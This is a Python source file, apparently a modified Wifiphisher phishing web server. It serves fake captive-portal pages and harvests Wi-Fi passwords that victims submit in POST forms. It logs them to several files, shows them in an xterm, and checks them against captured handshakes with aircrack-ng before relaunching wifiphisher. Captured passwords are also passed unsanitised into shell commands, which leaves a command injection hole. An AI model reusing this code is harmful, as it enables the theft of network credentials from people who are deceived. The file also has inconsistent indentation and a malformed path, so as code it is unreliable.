import SimpleHTTPServer
import BaseHTTPServer
import httplib
import SocketServer
import ssl
import socket
import cgi
import os
from __main__ import *
from constants import *
import capchecking
import subprocess

template = False
terminate = False
dir_path=os.path.dirname(os.path.realpath(__file__))

## , ap_mac, essid, channel
class SecureHTTPServer(BaseHTTPServer.HTTPServer):
    """
    Simple HTTP server that extends the SimpleHTTPServer standard
    module to support the SSL protocol.

    Only the server is authenticated while the client remains
    unauthenticated (i.e. the server will not request a client
    certificate).

    It also reacts to self.stop flag.
    """
    def __init__(self, server_address, HandlerClass):
        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
        self.socket = ssl.SSLSocket(
            socket.socket(self.address_family, self.socket_type),
            keyfile=PEM,
            certfile=PEM
        )

        self.server_bind()
        self.server_activate()

    def serve_forever(self):
        """
        Handles one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()


class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTPS server. It responds to
    everything with a 301 redirection to the HTTP server.
    """
    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://' + NETWORK_GW_IP + ':' + str(PORT))
        self.end_headers()

    def log_message(self, format, *args):
        return


class HTTPServer(BaseHTTPServer.HTTPServer):
    """
    HTTP server that reacts to self.stop flag.
    """

    def serve_forever(self):
        """
        Handle one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()


class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTP server that logs POST requests.
    """
    def redirect(self, page="/"):
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def do_GET(self):
        global template

        # Two slashes in the URL will confuse our server
        if self.path.split('.')[-1].count("/") > 0:
            self.redirect("/index.html")

        template_path = template.get_path()
        wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
        with open(wifi_webserver_tmp, "a+") as log_file:
            log_file.write(template+'[' + T + '*' + W + '] ' + O + "GET " + T +
                           self.client_address[0] + W + "\n"
                           )
            log_file.close()
	wifi_webserver_tmp2 = dir_path+os.path.sep+"wifiphisher-webserver2"
        with open(wifi_webserver_tmp2, "a+") as log_file2:
            log_file2.write(template+'[' + T + '*' + W + '] ' + O + "GET " + T +
                           self.client_address[0] + W + "\n"
                           )
            log_file2.close()
        ##subprocess.call("",shell=True)
        if not os.path.isfile("%s/%s" % (template_path, self.path)):
            self.path = "index.html"

        if self.path.endswith(".html"):
            self.send_response(200)
            self.send_header('Content-type', 'text-html')
            self.end_headers()
            # Send file content to client
            self.wfile.write(template.render(self.path).encode('utf-8'))
            return
        # Leave binary and other data to default handler.
        else:
            os.chdir(template_path)
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        global terminate
        redirect = False
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-type'],
                     })
        if not form.list:
            return
        for item in form.list:
            if item.name and item.value and POST_VALUE_PREFIX in item.name:
                redirect = True
                wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
                with open(wifi_webserver_tmp, "a+") as log_file:
                    log_file.write(template+'[' + T + '*' + W + '] ' + O + "POST " +
                                   T + self.client_address[0] +
                                   R + " " + item.name + "=" + item.value +
                                   W + "\n"
                                   )
                    ##mine
                    ##password, bssid, essid, channel
                    #capcheck=Thread(target=capchecking.capchecking1, args=(item.value, ap_mac, essid, channel))
                    #capcheck.daemon = True
                    #capcheck.start()
                    #capchecking1(item.value, ap_mac, essid, channel)

                    log_file.close()
		wifi_webserver_tmp2 = dir_path+os.path.sep+"/wifiphisher-webserver2"
                with open(wifi_webserver_tmp2, "a+") as log_file2:
                    log_file2.write(template+'[' + T + '*' + W + '] ' + O + "POST " +
                                   T + self.client_address[0] +
                                   R + " " + item.name + "=" + item.value +
                                   W + "\n"
                                   )
                    log_file2.close()
                wifi_webserver_tmp3 = dir_path+os.path.sep+"password.txt"
                with open(wifi_webserver_tmp3, "a+") as log_file3:
                    log_file3.write(item.value+"\n")
                    log_file3.close()
                    subprocess.call("xterm -hold -e \"echo 'new pass= "+item.value+" '\" & ",shell=True)
                subprocess.call("echo \""+template+";p="+item.value+"\" | tee -a ~/Desktop/NOTEW",shell=True)
                    
        if redirect:
            self.redirect("/upgrading.html")
            terminate = True
            return
        self.redirect()

    def log_message(self, format, *args):
        return


def stop_server(port=PORT, ssl_port=SSL_PORT):
    """
    Sends QUIT request to HTTP server running on localhost:<port>
    """
    conn = httplib.HTTPConnection("localhost:%d" % port)
    conn.request("QUIT", "/")
    conn.getresponse()

    conn = httplib.HTTPSConnection("localhost:%d" % ssl_port)
    conn.request("QUIT", "/")
    conn.getresponse()


def serve_template(t):
    global template
    template = t


def capchecking1(password, bssid, essid, channel):
    ##password="20172017"
    ##essid="NetComm"
    passfile="./handshakes/password"
    wppath="sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ"
    subprocess.call("echo \""+password+"\" >> "+passfile, shell=True)
    a=1
    while a<100 :
        b=str(a).zfill(2)
        capfile='./handshakes/'+essid+'-'+b+'.cap'
        print(capfile)
        if os.path.exists(capfile) :
            capcheck=subprocess.getoutput("aircrack-ng -w "+passfile+" "+capfile+" | grep \"KEY FOUND\" && echo \"found\"")
            if "found" in capcheck:
                ##kill wifiphisher
                print("found")
                subprocess.call("killall wifiphisher",shell=True)
                break
            else:
                ##kill wifiphisher
                ##restart wifiphisher
                ##kill aireplay-ng
                print("not found")
                print("checknewcap")
                a+=1
        else :
            print("need more capfiles")
            subprocess.call("killall wifiphisher",shell=True)
            subprocess.call("killall cpulimit",shell=True)
            ##subprocess.call("killall aireplay-ng",shell=True)
            subprocess.call("sudo gnome-terminal -e \""+wppath+" --essid "+essid+"\"",shell=True)



